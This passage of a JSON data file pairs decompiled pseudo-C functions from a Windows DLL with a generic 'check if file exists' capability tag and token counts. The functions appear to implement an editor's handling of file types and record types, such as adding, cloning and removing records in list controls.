            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.18002aa90(int64_t arg1)\n\n{\n    ulong ***pppuVar1;\n    ulong *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    char in_DL;\n    ulong ***pppuVar6;\n    ulong *puVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    char16_t *pcVar10;\n    uchar auStack456 [32];\n    ulong uStack424;\n    int64_t iStack416;\n    ulong ***apppuStack408 [3];\n    uint64_t uStack384;\n    ulong auStack376 [4];\n    ulong auStack344 [4];\n    ulong auStack312 [4];\n    uchar auStack280 [32];\n    uchar auStack248 [208];\n    uint64_t uStack40;\n    \n    uStack424 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack456;\n    iVar3 = (**0x1800de7f0)(*(arg1 + 0x70), 0x188, 0, 0);\n    if (iVar3 != -1) {\n        iVar4 = (**0x1800de7f0)(*(arg1 + 0xb8), 0x188, 0, 0);\n        if (iVar4 == -1) {\n            iVar4 = -1;\n        }\n        if ((in_DL == '\\0') || (iVar4 != -1)) {\n            iVar8 = iVar3 * 0xf0 + *(arg1 + 0xd8);\n            iVar5 = *(iVar8 + 0x70) - *(iVar8 + 0x68);\n            if (iVar5 / 0xa0 < 999) {\n                fcn.1800276c0(iVar5, apppuStack408);\n                if (in_DL != '\\0') {\n                    iVar9 = iVar4 * 0xa0;\n                    iVar5 = *(iVar8 + 0x68);\n                    pppuVar6 = iVar9 + iVar5;\n                    if (apppuStack408 != pppuVar6) {\n                        pppuVar1 = pppuVar6 + 2;\n                        if (0x7 < pppuVar6[3]) {\n                            pppuVar6 = *pppuVar6;\n                        }\n                        fcn.180010d70(apppuStack408, pppuVar6, *pppuVar1);\n                        iVar5 = *(iVar8 + 0x68);\n                    }\n                    puVar7 = iVar9 + 0x20 + iVar5;\n                    if (auStack376 != puVar7) {\n                        puVar2 = puVar7 + 2;\n                        if (7 < puVar7[3]) {\n                            puVar7 = *puVar7;\n                        }\n                        fcn.180010d70(auStack376, puVar7, *puVar2);\n                        iVar5 = *(iVar8 + 0x68);\n                    }\n                    puVar7 = iVar9 + 0x40 + iVar5;\n                    if (auStack344 != puVar7) {\n                        puVar2 = puVar7 + 2;\n                        if (7 < puVar7[3]) {\n                            puVar7 = *puVar7;\n                        }\n                        fcn.180010d70(auStack344, puVar7, *puVar2);\n                        iVar5 = *(iVar8 + 0x68);\n                    }\n                    puVar7 = iVar9 + 0x60 + iVar5;\n                    if (auStack312 != puVar7) {\n                        puVar2 = puVar7 + 2;\n                        if (7 < puVar7[3]) {\n                            puVar7 = *puVar7;\n                        }\n                        fcn.180010d70(auStack312, puVar7, *puVar2);\n                    }\n                }\n                iVar5 = *(iVar8 + 0x70);\n                if (iVar5 == *(iVar8 + 0x78)) {\n                    fcn.18002edd0(iVar8 + 0x68, iVar5, apppuStack408);\n                }\n                else {\n                    iStack416 = iVar5;\n                    fcn.18000da90(iVar5, apppuStack408);\n                    fcn.18000da90(iVar5 + 0x20, auStack376);\n                    fcn.18000da90(iVar5 + 0x40, auStack344);\n                    fcn.18000da90(iVar5 + 0x60, auStack312);\n                    fcn.18000da90(iVar5 + 0x80, auStack280);\n                    *(iVar8 + 0x70) = *(iVar8 + 0x70) + 0xa0;\n                }\n                iVar5 = *(iVar8 + 0x70);\n                iVar8 = *(iVar8 + 0x68);\n                pppuVar6 = apppuStack408;\n                if (7 < uStack384) {\n                    pppuVar6 = apppuStack408[0];\n                }\n                (**0x1800de7f0)(*(arg1 + 0xb8), 0x180, 0, pppuVar6);\n                (**0x1800de7f0)(*(arg1 + 0xb8), 0x186, (iVar5 - iVar8) / 0xa0 + -1, 0);\n                fcn.180028210(arg1);\n                *(arg1 + 0x61) = 0;\n                *(arg1 + 99) = in_DL;\n                fcn.180028690(arg1);\n                fcn.1800252e0(apppuStack408);\n            }\n            else {\n                fcn.180020a90(auStack248, 100, L\"Only %i Record Types can be defined per File Type.\", 999);\n                pcVar10 = L\"Add New Record Types\";\n                if (in_DL != '\\0') {\n                    pcVar10 = L\"Clone Selected Record Types\";\n                }\n                (**0x1800de710)(*(arg1 + 0x18), auStack248, pcVar10, 0x10);\n            }\n        }\n    }\n    fcn.18008fb00(uStack40 ^ auStack456);\n    return;\n}\n",
        "token_count": 1378
    },
    "18002bc9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n\nvoid fcn.18002bc90(int64_t arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    ulong *puVar7;\n    int64_t iVar8;\n    int64_t *piVar9;\n    ulong *puVar10;\n    ulong *puVar11;\n    int64_t iVar12;\n    int64_t arg2_00;\n    int64_t iVar13;\n    ulong var_50h;\n    uchar auStack392 [32];\n    code *pcStack360;\n    int64_t iStack344;\n    ulong uStack336;\n    int64_t aiStack328 [3];\n    uint64_t uStack304;\n    ushort uStack296;\n    ushort uStack294;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    ushort auStack264 [8];\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    ushort auStack232 [8];\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uchar uStack200;\n    int64_t iStack192;\n    ulong uStack184;\n    uint uStack176;\n    uint uStack172;\n    uint auStack168 [2];\n    ulong uStack160;\n    ulong auStack152 [2];\n    ulong var_80h;\n    ulong var_bp_70h;\n    ulong var_bp_60h;\n    ulong var_50h_2;\n    ulong var_40h;\n    ulong var_bp_38h;\n    uint64_t var_bp_30h;\n    ulong var_28h;\n    ulong var_bp_20h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    uStack336 = 0xfffffffffffffffe;\n    var_bp_30h = *0x180123080 ^ auStack392;\n    iStack344 = arg1;\n    cVar4 = fcn.18002c1f0(arg1, CONCAT71(arg2 >> 8, 1));\n    if ((cVar4 != '\\0') && (iVar5 = (**0x1800de7f0)(*(arg1 + 0x70), 0x188, 0, 0),  iVar5 != -1)) {\n        arg2_00 = iVar5 * 0xf0 + *(arg1 + 0xd8);\n        uStack280 = *0x180101900;\n        uStack276 = *0x180101904;\n        uStack272 = *0x180101908;\n        uStack268 = *0x18010190c;\n        iVar12 = 0;\n        uStack296 = 0;\n        uStack248 = *0x180101900;\n        uStack244 = *0x180101904;\n        uStack240 = *0x180101908;\n        uStack236 = *0x18010190c;\n        auStack264[0] = 0;\n        uStack216 = *0x180101900;\n        uStack212 = *0x180101904;\n        uStack208 = *0x180101908;\n        uStack204 = *0x18010190c;\n        auStack232[0] = 0;\n        uStack200 = 0;\n        iStack192 = 0;\n        uStack184 = 0;\n        uStack176 = 0;\n        uStack172 = 0;\n        auStack168[0] = 0;\n        auStack168[1] = 0;\n        uStack160 = 0;\n        pcStack360 = fcn.180003e40;\n        iVar13 = 3;\n        fcn.180090060(auStack152, 0x20, 3, 0x18000da70);\n        puVar6 = fcn.18002e5c0(aiStack328, arg2_00, 0x1800f66d0);\n        if (&uStack296 != puVar6) {\n            if (7 < CONCAT44(uStack268, uStack272)) {\n                uVar1 = CONCAT44(uStack268, uStack272) * 2 + 2;\n                iVar3 = CONCAT44(uStack292, CONCAT22(uStack294, uStack296));\n                iVar8 = iVar3;\n                if ((0xfff < uVar1) && (iVar8 = *(iVar3 + -8),  0x1f < (iVar3 - iVar8) - 8U)) goto code_r0x00018002c0f4;\n                fcn.18008fb24(iVar8);\n            }\n            uStack292 = puVar6[1];\n            uStack288 = puVar6[2];\n            uStack284 = puVar6[3];\n            uStack296 = *puVar6;\n            uStack294 = *puVar6 >> 0x10;\n            uStack280 = puVar6[4];\n            uStack276 = puVar6[5];\n            uStack272 = puVar6[6];\n            uStack268 = puVar6[7];\n            *(puVar6 + 4) = 0;\n            *(puVar6 + 6) = 7;\n            *puVar6 = 0;\n        }\n        if (7 < uStack304) {\n            uVar1 = uStack304 * 2 + 2;\n            iVar8 = aiStack328[0];\n            if ((0xfff < uVar1) && (iVar8 = *(aiStack328[0] + -8),  0x1f < (aiStack328[0] - iVar8) - 8U)) {\ncode_r0x00018002c0f4:\n                fcn.1800b3528(iVar8, uVar1 + 0x27);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            fcn.18008fb24(iVar8);\n        }\n        piVar9 = arg2_00 + 0x20;\n        if (auStack264 != piVar9) {\n            if (7 < *(arg2_00 + 0x38)) {\n                piVar9 = *piVar9;\n            }\n            fcn.180010d70(auStack264, piVar9, *(arg2_00 + 0x30));\n        }\n        piVar9 = arg2_00 + 0x40;\n        if (auStack232 != piVar9) {\n            if (7 < *(arg2_00 + 0x58)) {\n                piVar9 = *piVar9;\n            }\n            fcn.180010d70(auStack232, piVar9, *(arg2_00 + 0x50));\n        }\n        uStack200 = *(arg2_00 + 0x60);\n        puVar6 = auStack168;\n        puVar11 = auStack152;\n        puVar7 = arg2_00 + 0x90;\n        do {\n            *puVar6 = *(puVar6 + (arg2_00 - auStack168) + 0x80);\n            if (puVar11 != puVar7) {\n                puVar10 = puVar7;\n                if (7 < puVar7[3]) {\n                    puVar10 = *puVar7;\n                }\n                fcn.180010d70(puVar11, puVar10, puVar7[2]);\n            }\n            puVar11 = puVar11 + 4;\n            puVar6 = puVar6 + 1;\n            puVar7 = puVar7 + 4;\n            iVar13 = iVar13 + -1;\n        } while (iVar13 != 0);\n        iVar13 = (*(arg2_00 + 0x70) - *(arg2_00 + 0x68)) / 0xa0;\n        fcn.18002daa0(&iStack192, iVar13);\n        iVar8 = iStack344;\n        for (; iStack344 = iVar8,  iVar13 != 0; iVar13 = iVar13 + -1) {\n            puVar11 = *(arg2_00 + 0x68) + iVar12;\n            if (iStack192 + iVar12 != puVar11) {\n                puVar7 = puVar11 + 2;\n                if (7 < puVar11[3]) {\n                    puVar11 = *puVar11;\n                }\n                fcn.180010d70(iStack192 + iVar12, puVar11, *puVar7);\n            }\n            puVar11 = *(arg2_00 + 0x68) + 0x20 + iVar12;\n            puVar7 = iStack192 + 0x20 + iVar12;\n            if (puVar7 != puVar11) {\n                puVar10 = puVar11 + 2;\n                if (7 < puVar11[3]) {\n                    puVar11 = *puVar11;\n                }\n                fcn.180010d70(puVar7, puVar11, *puVar10);\n            }\n            puVar11 = *(arg2_00 + 0x68) + 0x40 + iVar12;\n            puVar7 = iStack192 + 0x40 + iVar12;\n            if (puVar7 != puVar11) {\n                puVar10 = puVar11 + 2;\n                if (7 < puVar11[3]) {\n                    puVar11 = *puVar11;\n                }\n                fcn.180010d70(puVar7, puVar11, *puVar10);\n            }\n            puVar11 = *(arg2_00 + 0x68) + 0x60 + iVar12;\n            puVar7 = iStack192 + 0x60 + iVar12;\n            if (puVar7 != puVar11) {\n                puVar10 = puVar11 + 2;\n                if (7 < puVar11[3]) {\n                    puVar11 = *puVar11;\n                }\n                fcn.180010d70(puVar7, puVar11, *puVar10);\n            }\n            iVar12 = iVar12 + 0xa0;\n            iVar8 = iStack344;\n        }\n        iVar12 = *(iVar8 + 0xe0);\n        if (iVar12 == *(iVar8 + 0xe8)) {\n            fcn.18002eb70(iVar8 + 0xd8, iVar12, &uStack296);\n        }\n        else {\n            fcn.180024ec0(iVar12, &uStack296);\n            *(iVar8 + 0xe0) = *(iVar8 + 0xe0) + 0xf0;\n        }\n        puVar6 = &uStack296;\n        if (7 < CONCAT44(uStack268, uStack272)) {\n            puVar6 = CONCAT44(uStack292, CONCAT22(uStack294, uStack296));\n        }\n        (**0x1800de7f0)(*(iVar8 + 0x70), 0x180, 0, puVar6);\n        iVar12 = *(iVar8 + 0xe0) - *(iVar8 + 0xd8);\n        iVar12 = SUB168(SEXT816(-0x7777777777777777) * SEXT816(iVar12) >> 0x40, 0) + iVar12;\n        (**0x1800de7f0)(*(iVar8 + 0x70), 0x186, (-1 - (iVar12 >> 0x3f)) + (iVar12 >> 7), 0);\n        fcn.1800277d0(iVar8);\n        *(iVar8 + 0x61) = 0;\n        fcn.180027c20(iVar8);\n        fcn.180025000(&uStack296);\n    }\n    fcn.18008fb00(var_bp_30h ^ auStack392);\n    return;\n}\n",
        "token_count": 2693
    },
    "18002cbc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.18002cbc0(int64_t arg1)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    char in_DL;\n    ulong uVar6;\n    ushort *puVar7;\n    uchar auStack136 [32];\n    ushort *puStack104;\n    ulong uStack88;\n    ushort uStack80;\n    unkbyte6 Stack78;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    ushort uStack48;\n    unkbyte6 Stack46;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint64_t uStack16;\n    \n    uStack88 = 0xfffffffffffffffe;\n    uStack16 = *0x180123080 ^ auStack136;\n    iVar5 = arg1;\n    fcn.18003cb00();\n    fcn.18003cc00(iVar5, *(arg1 + 0x18), 0);\n    if (in_DL == '\\0') goto code_r0x00018002cd16;\n    uVar6 = 0;\n    iVar3 = (**0x1800de7f0)(*(arg1 + 0x70), 0x188, 0, 0);\n    if (iVar3 == -1) goto code_r0x00018002cd16;\n    uStack32 = *0x180101900;\n    uStack28 = *0x180101904;\n    uStack24 = *0x180101908;\n    uStack20 = *0x18010190c;\n    uStack48 = 0;\n    uStack64 = *0x180101900;\n    uStack60 = *0x180101904;\n    uStack56 = *0x180101908;\n    uStack52 = *0x18010190c;\n    uStack80 = 0;\n    puStack104 = &uStack80;\n    iVar3 = fcn.1800256b0(arg1, iVar3, CONCAT71(uVar6 >> 8, 1), &uStack48);\n    if (iVar3 < 0) {\n        (**0x1800de718)(*0x180123eb8, 0);\n        if (7 < CONCAT44(uStack52, uStack56)) {\n            uVar1 = CONCAT44(uStack52, uStack56) * 2 + 2;\n            iVar4 = CONCAT62(Stack78, uStack80);\n            iVar5 = iVar4;\n            if ((0xfff < uVar1) && (iVar5 = *(iVar4 + -8),  0x1f < (iVar4 - iVar5) - 8U)) {\ncode_r0x00018002cde8:\n                fcn.1800b3528(iVar5, uVar1 + 0x27);\n                goto code_r0x00018002cdee;\n            }\n            fcn.18008fb24(iVar5);\n        }\n        uStack64 = *0x180101900;\n        uStack60 = *0x180101904;\n        uStack56 = *0x180101908;\n        uStack52 = *0x18010190c;\n        uStack80 = 0;\n        if (CONCAT44(uStack20, uStack24) < 8) goto code_r0x00018002cd16;\n        iVar5 = CONCAT62(Stack46, uStack48);\n        if (0xfff < CONCAT44(uStack20, uStack24) * 2 + 2) {\n            iVar4 = iVar5 - *(iVar5 + -8);\n            iVar5 = *(iVar5 + -8);\njoined_r0x00018002cde1:\n            uStack80 = 0;\n            uStack64 = *0x180101900;\n            uStack60 = *0x180101904;\n            uStack56 = *0x180101908;\n            uStack52 = *0x18010190c;\n            if (0x1f < iVar4 - 8U) {\ncode_r0x00018002cdee:\n                fcn.1800b3528();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n    }\n    else {\n        puVar7 = &uStack80;\n        if (7 < CONCAT44(uStack52, uStack56)) {\n            puVar7 = CONCAT62(Stack78, uStack80);\n        }\n        (**0x1800de788)(*0x180123eb8, 0x24ba, puVar7);\n        if (7 < CONCAT44(uStack52, uStack56)) {\n            uVar1 = CONCAT44(uStack52, uStack56) * 2 + 2;\n            iVar4 = CONCAT62(Stack78, uStack80);\n            iVar5 = iVar4;\n            if ((0xfff < uVar1) && (iVar5 = *(iVar4 + -8),  0x1f < (iVar4 - iVar5) - 8U)) goto code_r0x00018002cde8;\n            fcn.18008fb24(iVar5);\n        }\n        uStack64 = *0x180101900;\n        uStack60 = *0x180101904;\n        uStack56 = *0x180101908;\n        uStack52 = *0x18010190c;\n        uStack80 = 0;\n        if (CONCAT44(uStack20, uStack24) < 8) goto code_r0x00018002cd16;\n        iVar5 = CONCAT62(Stack46, uStack48);\n        if (0xfff < CONCAT44(uStack20, uStack24) * 2 + 2) {\n            iVar4 = iVar5 - *(iVar5 + -8);\n            iVar5 = *(iVar5 + -8);\n            goto joined_r0x00018002cde1;\n        }\n    }\n    uStack80 = 0;\n    *0x180101900 = uStack64;\n    *0x180101904 = uStack60;\n    *0x180101908 = uStack56;\n    *0x18010190c = uStack52;\n    fcn.18008fb24(iVar5);\ncode_r0x00018002cd16:\n    fcn.18008fb00(uStack16 ^ auStack136);\n    return;\n}\n",
        "token_count": 1409
    },
    "180042d5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.180042d50(int64_t arg1)\n\n{\n    int32_t iVar1;\n    ulong arg2;\n    uchar *arg2_00;\n    uchar auStack152 [32];\n    uchar auStack120 [16];\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    ushort uStack88;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar uStack56;\n    ulong uStack48;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180123080 ^ auStack152;\n    arg2 = 0x188;\n    iVar1 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n    if (iVar1 == -1) {\n        arg2_00 = auStack120;\n        uStack104 = *0x180101910;\n        uStack100 = *0x180101914;\n        uStack96 = *0x180101918;\n        uStack92 = *0x18010191c;\n        auStack120[0] = 0;\n        uStack40 = 0;\n        uStack36 = 0;\n        uStack32 = 0;\n        uStack28 = 0;\n        uStack72 = *0x180101900;\n        uStack68 = *0x180101904;\n        uStack64 = *0x180101908;\n        uStack60 = *0x18010190c;\n        uStack88 = 0;\n        uStack56 = 0;\n        uStack48 = 0;\n        fcn.180048db0(&uStack48, arg2);\n        fcn.180042e30(auStack120);\n    }\n    else {\n        arg2_00 = iVar1 * 0x60 + *(arg1 + 0xc0);\n    }\n    fcn.180042f10(arg1, arg2_00);\n    fcn.180042fb0(arg1);\n    fcn.180043cf0(arg1);\n    fcn.18008fb00(uStack24 ^ auStack152);\n    return;\n}\n",
        "token_count": 512
    },
    "180042fb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.180042fb0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    \n    iVar3 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n    if (iVar3 != -1) {\n        iVar1 = *(arg1 + 200);\n        iVar2 = *(arg1 + 0xc0);\n        uVar4 = (**0x1800de798)(*(arg1 + 0x18), 0x27db);\n        (**0x1800de770)(uVar4, iVar3 < (iVar1 - iVar2) / 0x60 + -1);\n        uVar4 = (**0x1800de798)(*(arg1 + 0x18), 0x27dc);\n        (**0x1800de770)(uVar4, 0 < iVar3);\n    }\n    return;\n}\n",
        "token_count": 225
    },
    "1800437f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.1800437f0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t *arg2;\n    int64_t iVar2;\n    ulong *arg2_00;\n    int64_t *piVar3;\n    ulong arg2_01;\n    ulong *puVar4;\n    ulong *puVar5;\n    int64_t arg2_02;\n    ulong *arg1_00;\n    int64_t iVar6;\n    ushort *puVar7;\n    int64_t iVar8;\n    ulong *puVar9;\n    ulong *puVar10;\n    uchar auStack216 [32];\n    int64_t iStack184;\n    int64_t iStack176;\n    int64_t *piStack168;\n    ulong uStack160;\n    uchar uStack152;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    ushort uStack120;\n    unkbyte6 Stack118;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack88;\n    int64_t iStack80;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint64_t uStack56;\n    \n    uStack160 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ auStack216;\n    iStack176 = arg1;\n    iVar1 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n    if (iVar1 != -1) {\n        piVar3 = arg1 + 0xc0;\n        puVar9 = iVar1 * 0x60 + *piVar3;\n        uStack136 = *0x180101910;\n        uStack132 = *0x180101914;\n        uStack128 = *0x180101918;\n        uStack124 = *0x18010191c;\n        uStack152 = 0;\n        uStack104 = *0x180101900;\n        uStack100 = *0x180101904;\n        uStack96 = *0x180101908;\n        uStack92 = *0x18010190c;\n        uStack120 = 0;\n        uStack88 = 0;\n        iStack80 = 0;\n        uStack72 = 0;\n        uStack68 = 0;\n        uStack64 = 0;\n        uStack60 = 0;\n        piStack168 = piVar3;\n        if (&uStack152 != puVar9) {\n            puVar4 = puVar9;\n            if (0xf < puVar9[3]) {\n                puVar4 = *puVar9;\n            }\n            fcn.180011120(&uStack152, puVar4, puVar9[2]);\n        }\n        arg2 = puVar9 + 4;\n        if (&uStack120 != arg2) {\n            if (7 < puVar9[7]) {\n                arg2 = *arg2;\n            }\n            fcn.180010d70(&uStack120, arg2, puVar9[6]);\n        }\n        uStack88 = *(puVar9 + 8);\n        iVar2 = (puVar9[10] - puVar9[9]) / 6 + (puVar9[10] - puVar9[9] >> 0x3f);\n        iVar2 = (iVar2 >> 4) - (iVar2 >> 0x3f);\n        iStack184 = iVar2;\n        fcn.180048b10(&iStack80, iVar2);\n        if (iVar2 != 0) {\n            iVar8 = 0;\n            do {\n                iVar6 = 0;\n                puVar4 = iStack80 + iVar8;\n                puVar10 = puVar9[9] + iVar8;\n                if (puVar4 != puVar10) {\n                    puVar5 = puVar10;\n                    if (0xf < puVar10[3]) {\n                        puVar5 = *puVar10;\n                    }\n                    fcn.180011120(puVar4, puVar5, puVar10[2]);\n                }\n                piVar3 = puVar10 + 4;\n                if (puVar4 + 4 != piVar3) {\n                    if (7 < puVar10[7]) {\n                        piVar3 = *piVar3;\n                    }\n                    fcn.180010d70(puVar4 + 4, piVar3, puVar10[6]);\n                }\n                *(puVar4 + 8) = *(puVar10 + 8);\n                *(puVar4 + 0x44) = *(puVar10 + 0x44);\n                arg2_02 = puVar10[10] - puVar10[9] >> 6;\n                fcn.180048c70(puVar4 + 9, arg2_02);\n                arg1 = iStack176;\n                piVar3 = piStack168;\n                for (; iStack176 = arg1,  piStack168 = piVar3,  arg2_02 != 0; arg2_02 = arg2_02 + -1) {\n                    puVar5 = puVar10[9] + iVar6;\n                    arg1_00 = puVar4[9] + iVar6;\n                    if (arg1_00 != puVar5) {\n                        arg2_00 = puVar5;\n                        if (0xf < puVar5[3]) {\n                            arg2_00 = *puVar5;\n                        }\n                        fcn.180011120(arg1_00, arg2_00, puVar5[2]);\n                    }\n                    piVar3 = puVar5 + 4;\n                    if (arg1_00 + 4 != piVar3) {\n                        if (7 < puVar5[7]) {\n                            piVar3 = *piVar3;\n                        }\n                        fcn.180010d70(arg1_00 + 4, piVar3, puVar5[6]);\n                    }\n                    iVar6 = iVar6 + 0x40;\n                    iVar2 = iStack184;\n                    arg1 = iStack176;\n                    piVar3 = piStack168;\n                }\n                iVar8 = iVar8 + 0x60;\n                iVar2 = iVar2 + -1;\n                iStack184 = iVar2;\n            } while (iVar2 != 0);\n        }\n        iVar2 = *(arg1 + 200);\n        if (iVar2 == *(arg1 + 0xd0)) {\n            fcn.1800490a0(piVar3, iVar2, &uStack152);\n        }\n        else {\n            fcn.1800434a0(iVar2, &uStack152);\n            piVar3[1] = piVar3[1] + 0x60;\n        }\n        puVar7 = &uStack120;\n        if (7 < CONCAT44(uStack92, uStack96)) {\n            puVar7 = CONCAT62(Stack118, uStack120);\n        }\n        (**0x1800de7f0)(*(arg1 + 0x58), 0x180, 0, puVar7);\n        arg2_01 = 0x186;\n        (**0x1800de7f0)(*(arg1 + 0x58), 0x186, (piVar3[1] - *piVar3) / 0x60 + -1, 0);\n        fcn.180042d50(arg1);\n        *(arg1 + 0x51) = 0;\n        fcn.180043070(arg1);\n        fcn.180048db0(&iStack80, arg2_01);\n        fcn.180042e30(&uStack152);\n    }\n    fcn.18008fb00(uStack56 ^ auStack216);\n    return;\n}\n",
        "token_count": 1731
    },
    "180043b5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint64_t fcn.180043b50(int64_t arg1)\n\n{\n    ulong *arg1_00;\n    ulong *puVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    ulong *arg2;\n    int32_t iVar5;\n    uint32_t uVar6;\n    ulong *puVar7;\n    int64_t arg2_00;\n    \n    arg2 = 0x188;\n    uVar3 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n    uVar2 = uVar3;\n    if (uVar2 == 0xffffffff) {\n        return uVar3;\n    }\n    iVar4 = *(arg1 + 200);\n    arg2_00 = uVar2 * 0x60 + 0x60 + *(arg1 + 0xc0);\n    if (arg2_00 != iVar4) {\n        puVar7 = arg2_00 + -8;\n        do {\n            fcn.18000dd60(puVar7 + -0xb, arg2_00);\n            arg2 = puVar7 + 5;\n            fcn.18000d960(puVar7 + -7, arg2);\n            arg1_00 = puVar7 + -2;\n            puVar1 = puVar7 + 10;\n            *(puVar7 + -3) = *(puVar7 + 9);\n            if (arg1_00 != puVar1) {\n                fcn.180048db0(arg1_00, arg2);\n                *arg1_00 = *puVar1;\n                puVar7[-1] = puVar7[0xb];\n                *puVar7 = puVar7[0xc];\n                *puVar1 = 0;\n                puVar7[0xb] = 0;\n                puVar7[0xc] = 0;\n            }\n            arg2_00 = arg2_00 + 0x60;\n            puVar7 = puVar7 + 0xc;\n        } while (arg2_00 != iVar4);\n        iVar4 = *(arg1 + 200);\n    }\n    fcn.180048db0(iVar4 + -0x18, arg2);\n    fcn.180042e30(iVar4 + -0x60);\n    *(arg1 + 200) = *(arg1 + 200) + -0x60;\n    iVar4 = *(arg1 + 200) - *(arg1 + 0xc0);\n    iVar4 = iVar4 / 6 + (iVar4 >> 0x3f);\n    iVar5 = (iVar4 >> 4) - (iVar4 >> 0x3f);\n    uVar6 = iVar5 - 1;\n    if (uVar2 <= iVar5 + -2) {\n        uVar6 = uVar2;\n    }\n    (**0x1800de7f0)(*(arg1 + 0x58), 0x182, uVar2, 0);\n    (**0x1800de7f0)(*(arg1 + 0x58), 0x186, uVar6, 0);\n    *(arg1 + 0x51) = 0x100;\n    fcn.180042d50(arg1);\n    return uVar6;\n}\n",
        "token_count": 744
    },
    "180043cf": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.180043cf0(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uchar *arg2;\n    ushort *puVar8;\n    int64_t iVar9;\n    uchar auStack280 [40];\n    ulong uStack240;\n    int64_t aiStack232 [3];\n    uint64_t uStack208;\n    ushort uStack200;\n    unkbyte6 Stack198;\n    ulong uStack184;\n    uint64_t uStack176;\n    uchar auStack160 [24];\n    uchar auStack136 [16];\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    ushort uStack104;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar uStack72;\n    ulong uStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint64_t uStack40;\n    \n    uStack240 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack280;\n    uVar5 = 0x188;\n    iVar3 = (**0x1800de7f0)(*(arg1 + 0x58), 0x188, 0, 0);\n    if (iVar3 == -1) {\n        uStack120 = *0x180101910;\n        uStack116 = *0x180101914;\n        uStack112 = *0x180101918;\n        uStack108 = *0x18010191c;\n        auStack136[0] = 0;\n        uStack88 = *0x180101900;\n        uStack84 = *0x180101904;\n        uStack80 = *0x180101908;\n        uStack76 = *0x18010190c;\n        uStack104 = 0;\n        uStack72 = 0;\n        uStack64 = 0;\n        uStack56 = 0;\n        uStack52 = 0;\n        uStack48 = 0;\n        uStack44 = 0;\n        arg2 = auStack136;\n        fcn.180048db0(&uStack64, uVar5);\n        fcn.180042e30(auStack136);\n    }\n    else {\n        arg2 = iVar3 * 0x60 + *(arg1 + 0xc0);\n    }\n    (**0x1800de7f0)(*(arg1 + 0x68), 0x184, 0, 0);\n    iVar7 = *(arg2 + 0x48);\n    iVar9 = *(arg2 + 0x50);\n    if (iVar7 != iVar9) {\n        do {\n            fcn.180043fe0(aiStack232, iVar7);\n            puVar8 = &uStack200;\n            if (7 < uStack176) 